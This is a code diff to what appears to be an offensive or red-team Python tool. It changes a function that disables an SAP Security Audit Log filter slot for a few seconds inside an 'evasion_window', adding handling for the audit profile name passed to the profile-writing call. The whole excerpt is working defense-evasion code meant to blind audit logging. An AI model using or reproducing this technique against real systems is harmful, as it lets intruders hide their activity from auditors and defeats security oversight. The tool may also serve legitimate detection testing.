@@ -457,6 +457,7 @@ def tier3_probe_dyn_profile(state, node, creds=None,
 
 
 def tier3_sal_slot_disable(state, node, slotno,
+                              profile_name: str = "",
                               hold_seconds: float = 5.0,
                               creds=None) -> dict:
     """Phase 3 step 2 — disable one SAL filter slot for *hold_seconds*,
@@ -501,9 +502,41 @@ def tier3_sal_slot_disable(state, node, slotno,
     slotno_str = str(slotno).strip().zfill(4)
     sid = getattr(node, "sid", "?")
 
+    # Resolve the static profile name we'll pass as ID_NAME to
+    # RSAU_API_SET_PROFILE.  Order of preference:
+    #   1. Explicit operator argument (GUI prompts for it)
+    #   2. Whatever the baseline capture stored on the snapshot
+    #   3. Refuse — the kernel rejects '$DYN$' and empty as
+    #      "not a valid audit profile name"
+    explicit_name = (profile_name or "").strip()
+
     try:
+        # touched_params=[] explicitly opts OUT of the param restore
+        # loop — this technique only mutates the dyn profile, so
+        # restoring every captured TH_GET_PARAMETER value on window
+        # exit would (a) be wrong and (b) spam NOT_CHANGEABLE errors
+        # for the rsau/* / rec/* / stat/* static params.
         with evasion_window(node, state, technique, creds=creds,
+                             touched_params=[],
                              touched_dyn_profile=True) as frame:
+            # Persist the resolved profile name onto the snapshot so
+            # the window's restore phase can call SET_PROFILE with
+            # the same ID_NAME we used for the mutation.  If the
+            # operator passed one explicitly, prefer it; otherwise
+            # use whatever the baseline already had.
+            snap = frame["snapshot"]
+            effective_name = (explicit_name
+                              or snap.sal_profile_name)
+            if not effective_name:
+                return _wrap_result(
+                    technique, False,
+                    slotno=slotno_str, hold_seconds=hold_seconds,
+                    error=("SAL profile name required — pass "
+                           "profile_name (visible in RSAU_CONFIG as "
+                           "'Current Profile/Filter: <NAME>/NN'; "
+                           "e.g. 'SAPSEC' on stock S/4)"))
+            if explicit_name and not snap.sal_profile_name:
+                snap.sal_profile_name = explicit_name
             # Read fresh — never mutate from a stale baseline.
             current = read_dyn_profile(node, creds=creds)
             log_errors = _et_log_errors(current.get("ET_LOG"))
@@ -547,8 +580,8 @@ def tier3_sal_slot_disable(state, node, slotno,
                     copy["STATUS"] = " "
                 mutated_filt.append(copy)
 
-            w = write_dyn_profile(node, creds, mutated_filt,
-                                    et_filtex, et_text)
+            w = write_dyn_profile(node, creds, effective_name,
+                                    mutated_filt, et_filtex, et_text)
             if not w["ok"]:
                 return _wrap_result(
                     technique, False,
